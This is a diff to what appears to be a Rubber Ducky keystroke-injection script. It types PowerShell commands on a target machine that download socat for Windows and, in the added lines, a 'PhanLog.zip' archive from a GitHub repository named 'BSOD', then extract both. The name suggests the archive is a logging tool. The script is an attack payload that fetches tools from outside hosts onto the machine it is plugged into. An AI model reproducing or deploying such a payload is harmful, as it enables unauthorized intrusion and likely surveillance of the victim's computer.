@@ -37,9 +37,19 @@ ENTER
 REM //Download Files
 STRING wget 'https://github.com/StudioEtrange/socat-windows/archive/refs/heads/master.zip' -OutFile ZOLOFT.zip
 ENTER
+STRING mkdir PhanLog
+ENTER
+STRING cd PhanLog
+ENTER
+STRING wget 'https://github.com/KffeePt/BSOD/raw/main/PhanLog.zip' -OutFile PhanLog.zip
+ENTER
+STRING cd ../
+ENTER
 DELAY 3500
 REM //Extract Tools
 STRING Expand-Archive ZOLOFT.zip
+ENTER
+STRING Expand-Archive PhanLog\PhanLog.zip
 ENTER
 DELAY 100
 STRING cd ZOLOFT\socat-windows-master
